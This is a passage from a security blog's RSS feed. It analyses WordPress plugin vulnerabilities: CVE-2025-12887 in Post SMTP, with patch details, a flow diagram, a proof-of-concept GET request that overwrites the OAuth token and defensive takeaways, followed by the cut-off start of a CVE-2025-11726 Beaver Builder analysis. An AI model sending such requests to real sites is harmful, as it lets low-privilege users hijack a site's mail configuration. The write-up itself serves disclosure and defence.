class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;auth_token_expires&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$auth_token_expires&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;vendor_name&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;google&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_email&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user_email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Save&amp;ensp;the&amp;ensp;OAuth&amp;ensp;parameters&amp;ensp;to&amp;ensp;the&amp;ensp;WordPress&amp;ensp;options&amp;ensp;table.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postman_auth_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$oauth_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch introduces:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Capability check&lt;/strong&gt;&#xA;Only administrators (users with the &lt;code&gt;manage_options&lt;/code&gt; capability) are allowed to update the &lt;strong&gt;OAuth token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CSRF protection using a nonce&lt;/strong&gt;&#xA;A &lt;strong&gt;nonce verification&lt;/strong&gt; is added to ensure that the request actually originates from a legitimate WordPress page, preventing &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt; attacks.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Authenticated&amp;ensp;user&amp;ensp;(Subscriber&amp;ensp;or&amp;ensp;higher)&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Access&amp;ensp;admin&amp;ensp;area:&amp;ensp;/wp-admin/&#34;]&#xD;&#xA;--&gt;&amp;ensp;C[&#34;admin_init&amp;ensp;hook&amp;ensp;is&amp;ensp;triggered&#34;]&#xD;&#xA;--&gt;&amp;ensp;D[&#34;Post&amp;ensp;SMTP:&amp;ensp;handle_gmail_oauth_redirect()&amp;ensp;is&amp;ensp;executed&#34;]&#xD;&#xA;--&gt;&amp;ensp;E{&#34;Is&amp;ensp;GET[action]&amp;ensp;=&amp;ensp;gmail_oauth_redirect&amp;ensp;?&#34;}&#xD;&#xA;E&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;F[&#34;Function&amp;ensp;exits&amp;ensp;–&amp;ensp;No&amp;ensp;impact&#34;]&#xD;&#xA;E&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;G[&#34;Read&amp;ensp;parameters&amp;ensp;from&amp;ensp;URL:&amp;ensp;access_token,&amp;ensp;refresh_token,&amp;ensp;expires_in,&amp;ensp;user_email&#34;]&#xD;&#xA;--&gt;&amp;ensp;H{&#34;Is&amp;ensp;access_token&amp;ensp;present&amp;ensp;?&#34;}&#xD;&#xA;H&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;F&#xD;&#xA;H&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;I[&#34;Build&amp;ensp;OAuth&amp;ensp;data&amp;ensp;array&#34;]&#xD;&#xA;--&gt;&amp;ensp;J[&#34;update_option(&#39;postman_auth_token&#39;,&amp;ensp;oauth_data)&#34;]&#xD;&#xA;--&gt;&amp;ensp;K[&#34;OAuth&amp;ensp;token&amp;ensp;is&amp;ensp;overwritten&amp;ensp;by&amp;ensp;attacker-controlled&amp;ensp;data&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;Send the following request while authenticated as a &lt;strong&gt;Subscriber+&lt;/strong&gt; user:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/?action=gmail_oauth_redirect&amp;amp;access_token=access_token_payload&amp;amp;refresh_token=refresh_to_payload&amp;amp;expires_in=expires_in_payload&amp;amp;user_email=user_email@gmail.com&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;subscriber+&amp;ensp;cookie&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE-2025-12887 vulnerability stems from the Post SMTP plugin directly binding the &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; function to the &lt;code&gt;admin_init&lt;/code&gt; hook without performing any capability checks or additional authentication mechanisms. This allows any authenticated user, even with low privileges such as &lt;strong&gt;Subscriber/Contributor&lt;/strong&gt;, to send arbitrary requests that overwrite the &lt;code&gt;postman_auth_token&lt;/code&gt; value in the WordPress &lt;code&gt;options&lt;/code&gt; table.&lt;/p&gt;&#xA;&lt;p&gt;The absence of a &lt;strong&gt;capability check&lt;/strong&gt; and &lt;strong&gt;nonce verification&lt;/strong&gt; created a critical weakness in the OAuth handling workflow, potentially allowing attackers to take control over the site’s email sending configuration. This issue was resolved in version 3.6.2 by restricting execution to administrators and introducing nonce validation to prevent forged requests.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never attach sensitive actions (such as token updates) to general hooks like &lt;code&gt;admin_init&lt;/code&gt; without validating user privileges.&lt;/li&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;current_user_can()&lt;/code&gt; to ensure that only appropriate roles can perform high-risk actions.&lt;/li&gt;&#xA;&lt;li&gt;Enforce &lt;strong&gt;nonce verification&lt;/strong&gt; for any state-changing request to protect against CSRF.&lt;/li&gt;&#xA;&lt;li&gt;Do not trust data coming from &lt;code&gt;$_GET&lt;/code&gt; or &lt;code&gt;$_POST&lt;/code&gt; without proper authentication and authorization controls.&lt;/li&gt;&#xA;&lt;li&gt;Updating OAuth tokens should be treated as an administrative action and protected as strictly as other critical system changes.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/post-smtp/vulnerability/wordpress-post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-plugin-3-6-1-missing-authorization-to-authenticated-subscriber-oauth-token-update-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin &amp;lt;= 3.6.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11726 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-07-cve-2025-11726/</link>
      <pubDate>Sun, 07 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-07-cve-2025-11726/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Beaver Builder – WordPress Page Builder&lt;/strong&gt; plugin for WordPress contains a &lt;strong&gt;Missing Authorization&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;2.9.4&lt;/strong&gt;. The root cause is insufficient &lt;strong&gt;capability checks&lt;/strong&gt; in the &lt;strong&gt;REST API endpoints&lt;/strong&gt; under the namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, which manage &lt;strong&gt;Global Presets&lt;/strong&gt; across the entire website. This allows &lt;strong&gt;authenticated attackers&lt;/strong&gt; with at least &lt;strong&gt;Contributor&lt;/strong&gt; privileges to &lt;strong&gt;add, modify, or delete&lt;/strong&gt; &lt;strong&gt;global color presets&lt;/strong&gt; and &lt;strong&gt;background presets&lt;/strong&gt;, affecting all content built with &lt;strong&gt;Beaver Builder&lt;/strong&gt; site-wide.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11726&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11726&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/beaver-builder-lite-version/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Beaver Builder&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v2.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;register_rest_endpoints&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-controls/v1&amp;#39;&lt;/span&gt;&lt;span 